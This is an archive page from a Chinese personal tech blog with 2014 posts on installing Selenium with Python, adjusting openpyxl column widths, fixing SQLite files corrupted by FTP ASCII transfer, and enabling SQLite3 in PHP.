<!DOCTYPE html><html class="theme-next pisces use-motion" lang="zh-Hans"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1"><meta name="theme-color" content="#222"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css"><link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css"><link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css"><link rel="apple-touch-icon" sizes="180x180" href="/logo.png?v=5.1.4"><link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png?v=5.1.4"><link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png?v=5.1.4"><link rel="mask-icon" href="/logo.png?v=5.1.4" color="#222"><meta name="keywords" content="Google SEO, 互联网营销, 工业品营销, 矿山机械"><link rel="alternate" href="/atom.xml" title="Ray's Blog" type="application/atom+xml"><meta name="description" content="Google SEO|互联网营销|工业品营销|矿山机械电子商务|B2B、SEM、社交、EDM邮件营销、市场营销"><meta property="og:type" content="website"><meta property="og:title" content="Ray&#39;s Blog"><meta property="og:url" content="https://www.love4026.org/page/11/index.html"><meta property="og:site_name" content="Ray&#39;s Blog"><meta property="og:description" content="Google SEO|互联网营销|工业品营销|矿山机械电子商务|B2B、SEM、社交、EDM邮件营销、市场营销"><meta property="og:locale" content="zh-Hans"><meta name="twitter:card" content="summary"><meta name="twitter:title" content="Ray&#39;s Blog"><meta name="twitter:description" content="Google SEO|互联网营销|工业品营销|矿山机械电子商务|B2B、SEM、社交、EDM邮件营销、市场营销"><script type="text/javascript" id="hexo.configurations">var NexT=window.NexT||{},CONFIG={root:"/",scheme:"Pisces",version:"5.1.4",sidebar:{position:"left",display:"post",offset:12,b2t:!1,scrollpercent:!1,onmobile:!1},fancybox:!0,tabs:!0,motion:{enable:!0,async:!1,transition:{post_block:"fadeIn",post_header:"slideDownIn",post_body:"slideDownIn",coll_header:"slideLeftIn",sidebar:"slideUpIn"}},duoshuo:{userId:"0",author:"博主"},algolia:{applicationID:"",apiKey:"",indexName:"",hits:{per_page:10},labels:{input_placeholder:"Search for Posts",hits_empty:"We didn't find any results for the search: ${query}",hits_stats:"${hits} results found in ${time} ms"}}}</script><link rel="canonical" href="https://www.love4026.org/page/11/"><title>Google SEO|互联网营销|工业品营销|矿山机械电子商务|B2B、SEM、社交、EDM邮件营销、市场营销 - Ray's Blog</title></head><body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans"><div class="container sidebar-position-left page-home"><div class="headband"></div><header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="header-inner"><div class="site-brand-wrapper"><div class="site-meta"><div class="custom-logo-site-title"><a href="/" class="brand" rel="start"><span class="logo-line-before"><i></i></span> <span class="site-title">Ray's Blog</span><span class="logo-line-after"><i></i></span></a></div><h1 class="site-subtitle" itemprop="description">Google SEO|互联网营销|工业矿山机械</h1></div><div class="site-nav-toggle"> <button><span class="btn-bar"></span><span class="btn-bar"></span><span class="btn-bar"></span></button></div></div><nav class="site-nav"><ul id="menu" class="menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i><br> 首页</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="menu-item-icon fa fa-fw fa-user"></i><br> 关于</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="menu-item-icon fa fa-fw fa-tags"></i><br> 标签</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="menu-item-icon fa fa-fw fa-th"></i><br> 分类</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i><br> 归档</a></li><li class="menu-item menu-item-友情链接"><a href="/links/" rel="section"><i class="menu-item-icon fa fa-fw fa-link"></i><br> 友情链接</a></li></ul></nav></div></header><main id="main" class="main"><div class="main-inner"><div class="content-wrap"><div id="content" class="content"><section id="posts" class="posts-expand"><article class="post post-type-normal" itemscope itemtype="http://schema.org/Article"><div class="post-block"><link itemprop="mainEntityOfPage" href="https://www.love4026.org/313778/selenium-python自动化测试环境搭建/"><span hidden itemprop="author" itemscope itemtype="http://schema.org/Person"><meta itemprop="name" content="Ray Chang"><meta itemprop="description" content="Think Difficulty"><meta itemprop="image" content="/logo.png"></span><span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization"><meta itemprop="name" content="Ray's Blog"></span><header class="post-header"><h2 class="post-title" itemprop="name headline"> <a class="post-title-link" href="/313778/selenium-python自动化测试环境搭建/" itemprop="url">selenium python自动化测试环境搭建</a></h2><div class="post-meta"><span class="post-time"><span class="post-meta-item-icon"><i class="fa fa-calendar-o"></i></span> <span class="post-meta-item-text">发表于</span> <time title="创建于" itemprop="dateCreated datePublished" datetime="2014-03-17T08:03:29+08:00">2014-03-17</time></span> <span class="post-category"><span class="post-meta-divider">|</span><span class="post-meta-item-icon"><i class="fa fa-folder-o"></i></span> <span class="post-meta-item-text">分类于</span> <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/技术/" itemprop="url" rel="index"><span itemprop="name">技术</span></a></span></span> <span class="post-meta-divider">|</span><span class="post-wordcount"><span class="post-meta-item-icon"><i class="fa fa-file-word-o"></i></span> <span class="post-meta-item-text">字数统计&#58;</span> <span title="字数统计">1,612</span></span></div></header><div class="post-body" itemprop="articleBody"><p>selenium 是一个web的自动化测试工具，不少学习功能自动化的同学开始首选selenium ，相因为它相比QTP有诸多有点：</p><ul><li><p>免费，也不用再为破解QTP而大伤脑筋</p></li><li><p>小巧，对于不同的语言它只是一个包而已，而QTP需要下载安装1个多G 的程序。</p></li><li><p>这也是最重要的一点，不管你以前更熟悉C、 java、ruby、python、或都是C# ，你都可以通过selenium完成自动化测试，而QTP只支持VBS</p></li><li><p>支持多平台：windows、linux、MAC ，支持多浏览器：ie、ff、safari、opera、chrome</p></li><li><p>支持分布式测试用例的执行，可以把测试用例分布到不同的测试机器的执行，相当于分发机的功能。</p></li></ul><p>关于selenium的基础知识与java平台的结合，我之前写过一个《菜鸟学习自动化测试》系列，最近学python，所以想尝试一下selenium的在python平台如何搭建；还好这方法的文章很容易，在此将搭建步骤整理分享。</p><p>搭建平台windows</p><p>准备工具如下：</p><hr><h2 id="下载python"><a href="#下载python" class="headerlink" title="下载python"></a>下载python</h2><p><a href="http://python.org/getit/" target="_blank" rel="noopener">http://python.org/getit/</a></p><p>下载setuptools 【python的基础包工具】</p><p><a href="http://pypi.python.org/pypi/setuptools" target="_blank" rel="noopener">http://pypi.python.org/pypi/setuptools</a></p><p><a href="https://pypi.python.org/packages/2.7/s/setuptools/" target="_blank" rel="noopener">https://pypi.python.org/packages/2.7/s/setuptools/</a></p><p>下载pip 【python的安装包管理工具】</p><p><a href="https://pypi.python.org/pypi/pip" target="_blank" rel="noopener">https://pypi.python.org/pypi/pip</a></p><hr><p>因为版本都在更新，pyhton选择2.7.xx ，setuptools 选择你平台对应的版本，pip 不要担心tar.gz 在windows下一样可用。</p><h2 id="window安装步骤"><a href="#window安装步骤" class="headerlink" title="window安装步骤"></a>window安装步骤</h2><p>1、python的安装 ，这个不解释，exe文件运行安装即可，既然你选择python，相信你是熟悉python的，我安装目录C:\Python27</p><p>2、setuptools 的安装也非常简单，同样是exe文件，默认会找到python的安装路径，将安装到C:\Python27\Lib\site-packages 目录下。</p><p>通过上面提供的setuptools的连接，拖动页面到底部找到，<a href="https://pypi.python.org/packages/source/s/setuptools/setuptools-1.3.2.tar.gz#md5=441f2e58c0599d31597622a7b9eb605f" target="_blank" rel="noopener">setuptools-1.3.2.tar.gz</a> 文件（版本随着时间版本会有更新），对文件进行解压，找到ez_install.py文件，进入windows命令提示下执行ez_install.py：</p><p><strong>C:\setuptools-1.3&gt;python ez_install.py</strong> 没有报错表示安装成功。</p><p>（如果提示python不是内部或外部命令！别急，去配置一下环境变量吧）</p><p>修改我的电脑-&gt;属性-&gt;高级-&gt;环境变量-&gt;系统变量中的PATH为:</p><p>变量名：<code>PATH</code></p><p>变量值：<code>;C:\Python27</code></p><p>3、安装pip ，我默认解压在了C:\pip-1.3.1 目录下</p><p>4、打开命令提示符（开始—cmd回车）进入<code>C:\pip-1.3.1</code>目录下输入：</p><p><code>C:\pip-1.3.1 &gt; python setup.py install</code></p><p>5、再切换到<code>C:\Python27\Scripts</code> 目录下输入：</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:<span class="symbol">\P</span>ython27<span class="symbol">\S</span>cripts &gt; easy_install pip</span><br></pre></td></tr></table></figure><p>6、安装selenium，（下载地址： <a href="https://pypi.python.org/pypi/selenium" target="_blank" rel="noopener">https://pypi.python.org/pypi/selenium</a> ）</p><p>如果是联网状态的话，可以直接在C:\Python27\Scripts 下输入命令安装：</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Python27\<span class="keyword">Scripts </span>&gt; pip <span class="keyword">install </span>-U selenium</span><br></pre></td></tr></table></figure><p>如果没联网（这个一般不太可能），下载selenium 2.33.0 （目前的最新版本）</p><p>并解压把整个目录放到C:\Python27\Lib\site-packages 目录下。</p><p>=======如果你不分析wedriver 原理的话，下面两步可以省略=============</p><p>7、下载并安装（<a href="http://www.java.com/zh_CN/download/chrome.jsp?locale=zh_CN）什么？你没整过java，参考其它文档吧！这不难。" target="_blank" rel="noopener">http://www.java.com/zh_CN/download/chrome.jsp?locale=zh_CN）什么？你没整过java，参考其它文档吧！这不难。</a></p><p>8、 下载selenium 的服务端（<a href="https://code.google.com/p/selenium/）在页面的左侧列表中找到" target="_blank" rel="noopener">https://code.google.com/p/selenium/）在页面的左侧列表中找到</a></p><p>selenium-server-standalone-XXX.jar</p><p>对！就是这个东西，把它下载下来并解压；</p><p>在selenium-server-standalone-xxx.jar目录下使用命令 java -jar selenium-server-standalone-xxx.jar启动（如果打不开，查看是否端口被占 用：netstat -aon|findstr 4444）。</p><p>===============================================</p><h2 id="ubuntu-下安装方式："><a href="#ubuntu-下安装方式：" class="headerlink" title="ubuntu 下安装方式："></a>ubuntu 下安装方式：</h2><h3 id="1、安装：setuptools"><a href="#1、安装：setuptools" class="headerlink" title="1、安装：setuptools"></a>1、安装：setuptools</h3><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root<span class="symbol">@fnngj</span>-H24X:~<span class="meta"># apt-get install python-setuptools</span></span><br></pre></td></tr></table></figure><h3 id="2、安装pip"><a href="#2、安装pip" class="headerlink" title="2、安装pip"></a>2、安装pip</h3><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root@fnngj-H24X:/home/fnngj/<span class="keyword">python</span># tar -zxvf pip<span class="number">-1.4</span><span class="number">.1</span>.tar.gz</span><br><span class="line"></span><br><span class="line">root@fnngj-H24X:/home/fnngj/<span class="keyword">python</span># cd pip<span class="number">-1.4</span><span class="number">.1</span>/</span><br><span class="line"></span><br><span class="line">root@fnngj-H24X:/home/fnngj/<span class="keyword">python</span># <span class="keyword">python</span> setup.py install</span><br></pre></td></tr></table></figure><h3 id="3、安装selenium"><a href="#3、安装selenium" class="headerlink" title="3、安装selenium"></a>3、安装selenium</h3><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@fnngj-H24X:<span class="regexp">/home/</span>fnngj<span class="regexp">/python/</span>pip-<span class="number">1.4</span>.<span class="number">1</span><span class="comment"># pip install -U selenium</span></span><br></pre></td></tr></table></figure><p>恭喜~！ 你前期工作已经做了，上面的步骤确实有些繁琐，但是并不难，不过我们已经完成成了，下面体验一下成果吧！ 拿python网站上的例子：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> selenium import webdriver</span><br><span class="line"><span class="keyword">from</span> selenium.common.exceptions import NoSuchElementException</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.common.keys import Keys</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">browser = webdriver.Firefox() # <span class="builtin-name">Get</span> local session of firefox</span><br><span class="line">browser.<span class="builtin-name">get</span>(<span class="string">"http://www.yahoo.com"</span>) # Load page</span><br><span class="line">assert <span class="string">"Yahoo!"</span> <span class="keyword">in</span> browser.title</span><br><span class="line">elem = browser.find_element_by_name(<span class="string">"p"</span>) # <span class="builtin-name">Find</span> the query box</span><br><span class="line">elem.send_keys(<span class="string">"seleniumhq"</span> + Keys.RETURN)</span><br><span class="line">time.sleep(0.2) # Let the<span class="built_in"> page </span>load, will be added <span class="keyword">to</span> the API</span><br><span class="line">try:</span><br><span class="line">    browser.find_element_by_xpath(<span class="string">"//a[contains(@href,'http://seleniumhq.org')]"</span>)</span><br><span class="line">except NoSuchElementException:</span><br><span class="line">    assert 0, <span class="string">"can't find seleniumhq"</span></span><br><span class="line">browser.close()</span><br></pre></td></tr></table></figure><p>（运行过程中如果出现错误：</p><pre><code>WebDriverException: Message: u&apos;Unexpected error launching Internet Explorer.

Protected Mode settings are not the same for all zones. Enable Protected Mo

de must be set to the same value (enabled or disabled) for all zones.&apos;
</code></pre><p>更改IE的internet选项-&gt;安全，将Internet/本地Internet/受信任的站定/受限制的站点中的启用保护模式全部去 掉勾，或者全部勾上。）</p><hr><p>selenium + python的一份不错文档</p><p><a href="http://selenium.googlecode.com/git/docs/api/py/index.html" target="_blank" rel="noopener">http://selenium.googlecode.com/git/docs/api/py/index.html</a></p><p>===========================如果想通过其它浏览器（IE Chrome）运行脚本=================================</p><h2 id="安装Chrome-driver"><a href="#安装Chrome-driver" class="headerlink" title="安装Chrome driver"></a><strong>安装Chrome driver</strong></h2><p>chrome driver的下载地址在<a href="https://code.google.com/p/chromedriver/downloads/list" target="_blank" rel="noopener">这里</a>。</p><ol><li>下载解压，你会得到一个chromedriver.exe文件（我点开，运行提示started no prot 9515 ，这是干嘛的？端口9515被占了？中间折腾了半天），后来才知道需要把这家伙放到chrome的安装目录下…\Google\Chrome\Application\ ,然后设置path环境变量，把chrome的安装目录（我的：C:\Program Files\Google\Chrome\Application），然后再调用运行：</li></ol><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># coding = utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> selenium import webdriver</span><br><span class="line"></span><br><span class="line"><span class="built_in">driver</span> = webdriver.Chrome()</span><br><span class="line"></span><br><span class="line"><span class="built_in">driver</span>.get(<span class="string">'http://radar.kuaibo.com'</span>)</span><br><span class="line"></span><br><span class="line">print <span class="built_in">driver</span>.title</span><br><span class="line"></span><br><span class="line"><span class="built_in">driver</span>.quit()</span><br></pre></td></tr></table></figure><p>又报了个错：</p><pre><code>Chrome version must be &gt;= 27.0.1453.0\n  (Driver info: chromedriver=2.0,platform=Windows NT 5.1 SP3 x86)
</code></pre><p>说我chrome的版本没有大于27.0.1453.0 ，这个好办，更新到最新版本即可。</p><h2 id="安装IE-driver"><a href="#安装IE-driver" class="headerlink" title="安装IE driver"></a><strong>安装IE driver</strong></h2><p>在新版本的webdriver中，只有安装了ie driver使用ie进行测试工作。</p><p>ie driver的下载地址在<a href="https://code.google.com/p/selenium/downloads/list" target="_blank" rel="noopener">这里</a>，记得根据自己机器的操作系统版本来下载相应的driver。</p><p>暂时还没尝试，应该和chrome的安装方式类似。</p><p><strong>记得配置IE的保护模式</strong></p><p>如果要使用webdriver启动IE的话，那么就需要配置IE的保护模式了。</p><p>把IE里的保护模式都选上或都勾掉就可以了。</p><p>乙醇的安装方式：</p><p><a href="http://easonhan007.github.io/python/2013/05/07/setup-env/" target="_blank" rel="noopener">http://easonhan007.github.io/python/2013/05/07/setup-env/</a></p><p>5分钟安装好selenium webdriver + python 环境：</p><p><a href="http://v.youku.com/v_show/id_XNjQ1MDI5Nzc2.html?qq-pf-to=pcqq.group" target="_blank" rel="noopener">http://v.youku.com/v_show/id_XNjQ1MDI5Nzc2.html?qq-pf-to=pcqq.group</a></p></div><footer class="post-footer"><div class="post-eof"></div></footer></div></article><article class="post post-type-normal" itemscope itemtype="http://schema.org/Article"><div class="post-block"><link itemprop="mainEntityOfPage" href="https://www.love4026.org/313773/python-openpyxl列宽自适应/"><span hidden itemprop="author" itemscope itemtype="http://schema.org/Person"><meta itemprop="name" content="Ray Chang"><meta itemprop="description" content="Think Difficulty"><meta itemprop="image" content="/logo.png"></span><span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization"><meta itemprop="name" content="Ray's Blog"></span><header class="post-header"><h2 class="post-title" itemprop="name headline"> <a class="post-title-link" href="/313773/python-openpyxl列宽自适应/" itemprop="url">python openpyxl列宽自适应</a></h2><div class="post-meta"><span class="post-time"><span class="post-meta-item-icon"><i class="fa fa-calendar-o"></i></span> <span class="post-meta-item-text">发表于</span> <time title="创建于" itemprop="dateCreated datePublished" datetime="2014-03-15T13:04:36+08:00">2014-03-15</time></span> <span class="post-category"><span class="post-meta-divider">|</span><span class="post-meta-item-icon"><i class="fa fa-folder-o"></i></span> <span class="post-meta-item-text">分类于</span> <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/技术/" itemprop="url" rel="index"><span itemprop="name">技术</span></a></span></span> <span class="post-meta-divider">|</span><span class="post-wordcount"><span class="post-meta-item-icon"><i class="fa fa-file-word-o"></i></span> <span class="post-meta-item-text">字数统计&#58;</span> <span title="字数统计">84</span></span></div></header><div class="post-body" itemprop="articleBody"><p>使用此命令可以设置列宽：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">worksheet<span class="selector-class">.column_dimensions</span>[<span class="string">'A'</span>]<span class="selector-class">.width</span> = <span class="number">25</span></span><br></pre></td></tr></table></figure><p>则A列的宽度为25</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">column_widths = []</span><br><span class="line"><span class="keyword">for</span> row <span class="keyword">in</span> data:</span><br><span class="line">    <span class="keyword">for</span> <span class="selector-tag">i</span>, cell <span class="keyword">in</span> enumerate(row):</span><br><span class="line">        <span class="keyword">if</span> len(column_widths) &gt; <span class="selector-tag">i</span>:</span><br><span class="line">            <span class="keyword">if</span> len(cell) &gt; column_widths[i]:</span><br><span class="line">                column_widths[i] = len(cell)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            column_widths += [len(cell)]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> <span class="selector-tag">i</span>, column_width <span class="keyword">in</span> enumerate(column_widths):</span><br><span class="line">    worksheet<span class="selector-class">.column_dimensions</span>[get_column_letter(i+<span class="number">1</span>)]<span class="selector-class">.width</span> = column_width</span><br></pre></td></tr></table></figure><p>来源： <a href="http://stackoverflow.com/questions/13197574/python-openpyxl-column-width-size-adjust" target="_blank" rel="noopener">Python openpyxl column width size adjust</a></p></div><footer class="post-footer"><div class="post-eof"></div></footer></div></article><article class="post post-type-normal" itemscope itemtype="http://schema.org/Article"><div class="post-block"><link itemprop="mainEntityOfPage" href="https://www.love4026.org/313771/解决上传服务器的sqlite数据库文件打开出现错误error-database-disk-im/"><span hidden itemprop="author" itemscope itemtype="http://schema.org/Person"><meta itemprop="name" content="Ray Chang"><meta itemprop="description" content="Think Difficulty"><meta itemprop="image" content="/logo.png"></span><span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization"><meta itemprop="name" content="Ray's Blog"></span><header class="post-header"><h2 class="post-title" itemprop="name headline"> <a class="post-title-link" href="/313771/解决上传服务器的sqlite数据库文件打开出现错误error-database-disk-im/" itemprop="url">解决上传服务器的sqlite数据库文件打开出现错误error-database-disk-im</a></h2><div class="post-meta"><span class="post-time"><span class="post-meta-item-icon"><i class="fa fa-calendar-o"></i></span> <span class="post-meta-item-text">发表于</span> <time title="创建于" itemprop="dateCreated datePublished" datetime="2014-03-15T02:31:43+08:00">2014-03-15</time></span> <span class="post-category"><span class="post-meta-divider">|</span><span class="post-meta-item-icon"><i class="fa fa-folder-o"></i></span> <span class="post-meta-item-text">分类于</span> <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/个人日志/" itemprop="url" rel="index"><span itemprop="name">个人日志</span></a></span></span> <span class="post-meta-divider">|</span><span class="post-wordcount"><span class="post-meta-item-icon"><i class="fa fa-file-word-o"></i></span> <span class="post-meta-item-text">字数统计&#58;</span> <span title="字数统计">686</span></span></div></header><div class="post-body" itemprop="articleBody"><p>在本地服务器通过php创建sqlite数据库，或者通过工具比如sqliteadmin创建的sqlite数据库，使用是正常的，但如果上传到服务器上，再通过php打开会现错误：Error: database disk image is malformed， 提示你的数据库文件有损坏，以前一直找不到原因，今天从同事那儿得到解决办法，原来是因为自己使用FTP工具 filezilla上传数据库文件时没有更改传输模式，我使用的是默认，改为二进制模式即可解决此问题，另外，你把数据库压缩成zip格式后，再上传也能解决此问题。</p><h3 id="FTP的传输有两种方式：ASCII传输模式和二进制数据传输模式。"><a href="#FTP的传输有两种方式：ASCII传输模式和二进制数据传输模式。" class="headerlink" title="FTP的传输有两种方式：ASCII传输模式和二进制数据传输模式。"></a>FTP的传输有两种方式：ASCII传输模式和二进制数据传输模式。</h3><p>1．ASCII传输方式：假定用户正在拷贝的文件包含的简单ASCII码文本，如果在远程机器上运行的不是UNIX，当文件传输时ftp通常会自动地调整文件的内容以便于把文件解释成另外那台计算机存储文本文件的格式。</p><p>但是常常有这样的情况，用户正在传输的文件包含的不是文本文件，它们可能是程序，数据库，字处理文件或者压缩文件（尽管字处理文件包含的大部分是文本，其中也包含有指示页尺寸，字库等信息的非打印字符）。在拷贝任何非文本文件之前，用binary 命令告诉ftp逐字拷贝，不要对这些文件进行处理，这也是下面要讲的二进制传输。</p><p>2．二进制传输模式：在二进制传输中，保存文件的位序，以便原始和拷贝的是逐位一一对应的。即使目的地机器上包含位序列的文件是没意义的。例如，macintosh以二进制方式传送可执行文件到IBM VM系统，在对方系统上，此文件不能执行。（但是，它可以从VM系统上以二进制方式拷贝到另一macintosh，是可以执行的）。</p><p>如果你在ASCII方式下传输二进制文件，即使不需要也仍会转译。这会使传输稍微变慢 ，也会损坏数据，使文件变得不能用。（在大多数计算机上，ASCII方式一般假设每一字符的第一有效位无意义，因为ASCII字符组合不使用它。如果你传输二进制文件，所有的位都是重要的。）如果你知道这两台机器是同样的，则二进制方式对文本文件和数据文件都是有效的。</p><p><strong>数据库文件记得使用二进制模式!</strong></p></div><footer class="post-footer"><div class="post-eof"></div></footer></div></article><article class="post post-type-normal" itemscope itemtype="http://schema.org/Article"><div class="post-block"><link itemprop="mainEntityOfPage" href="https://www.love4026.org/313760/测试php空间是否支持sqlite3/"><span hidden itemprop="author" itemscope itemtype="http://schema.org/Person"><meta itemprop="name" content="Ray Chang"><meta itemprop="description" content="Think Difficulty"><meta itemprop="image" content="/logo.png"></span><span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization"><meta itemprop="name" content="Ray's Blog"></span><header class="post-header"><h2 class="post-title" itemprop="name headline"> <a class="post-title-link" href="/313760/测试php空间是否支持sqlite3/" itemprop="url">测试php空间是否支持sqlite3</a></h2><div class="post-meta"><span class="post-time"><span class="post-meta-item-icon"><i class="fa fa-calendar-o"></i></span> <span class="post-meta-item-text">发表于</span> <time title="创建于" itemprop="dateCreated datePublished" datetime="2014-03-14T09:25:08+08:00">2014-03-14</time></span> <span class="post-category"><span class="post-meta-divider">|</span><span class="post-meta-item-icon"><i class="fa fa-folder-o"></i></span> <span class="post-meta-item-text">分类于</span> <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/技术/" itemprop="url" rel="index"><span itemprop="name">技术</span></a></span></span> <span class="post-meta-divider">|</span><span class="post-wordcount"><span class="post-meta-item-icon"><i class="fa fa-file-word-o"></i></span> <span class="post-meta-item-text">字数统计&#58;</span> <span title="字数统计">648</span></span></div></header><div class="post-body" itemprop="articleBody"><p>测试代码如下：<br></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="keyword">if</span> (extension_loaded(<span class="string">'sqlite'</span>)) &#123; </span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> <span class="string">'Support'</span>; </span></span><br><span class="line"><span class="php">&#125;<span class="keyword">else</span>&#123; </span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> <span class="string">'Not Support'</span>; </span></span><br><span class="line"><span class="php">&#125; </span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><p></p><p>另外一个测试代码，测试sqlite3的</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">$db = <span class="keyword">new</span> SQLite3(<span class="string">'mysqlitedb.db'</span>);</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">$results = $db-&gt;query(<span class="string">'SELECT bar FROM foo'</span>);</span></span><br><span class="line"><span class="php"><span class="keyword">while</span> ($row = $results-&gt;fetchArray()) &#123;</span></span><br><span class="line"><span class="php">    var_dump($row);</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><p>在linux命令下测试：</p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -<span class="built_in">i</span> | grep -<span class="built_in">i</span> sqlite3</span><br></pre></td></tr></table></figure><p>应该会出现以下代码：</p><figure class="highlight ocaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sqlite3</span><br><span class="line"><span class="type">SQLite3</span> support =&gt; enabled</span><br><span class="line"><span class="type">SQLite3</span> <span class="keyword">module</span> version =&gt; <span class="number">0.7</span>-dev</span><br><span class="line">sqlite3.extension_dir =&gt; no <span class="keyword">value</span> =&gt; no <span class="keyword">value</span></span><br></pre></td></tr></table></figure><p>我的php5.2.3默认是支持sqlite3的，如果不支持，你可以升级下PHP</p><p>SQLite3 扩展自 PHP 5.3.0 起已默认启用。 允许在编译时使用 <em>–without-sqlite3</em> 禁用之。</p><p>Windows 用户必须启用 <var>php_sqlite3.dll</var> 方可使用该扩展。自 PHP 5.3.0 起，此扩展的 <acronym title="Dynamic Link Library">DLL</acronym> 文件 已包含于 Windows 版的 PHP 发行包中。</p><p>windows sqlite3启用办法：</p><pre><code>在php.ini中把extension=php_sqlite3.dll前面的分号去掉
</code></pre><p>军哥的LNMP0.9 PHP 5.2.17p1 (cli) 可能不支持sqlie3<br>你可以选择升级PHP，或者使用以下方法安装：</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">cd ~</span><br><span class="line">wget <span class="symbol">http:</span>/<span class="regexp">/pecl.php.net/get</span><span class="regexp">/sqlite3-0.6.tgz</span></span><br><span class="line"><span class="regexp">tar -zxf sqlite3-0.6.tgz</span></span><br><span class="line"><span class="regexp">cd sqlite3-0.6/</span></span><br><span class="line">phpize</span><br><span class="line">./configure --<span class="keyword">with</span>-php-config=<span class="regexp">/usr/local</span><span class="regexp">/php/bin</span><span class="regexp">/php-config</span></span><br><span class="line"><span class="regexp">make</span></span><br><span class="line"><span class="regexp">make install</span></span><br><span class="line"><span class="regexp">/etc</span><span class="regexp">/init.d/httpd</span> restart</span><br></pre></td></tr></table></figure><p>安装完成后如果还是不行，需要修改php.ini( <code>vi /usr/local/php/etc/php.ini</code>)一个配置<br> [在命令下查看配置文件路径的方法： <code>php -i | grep &#39;Configuration File&#39;</code>]</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 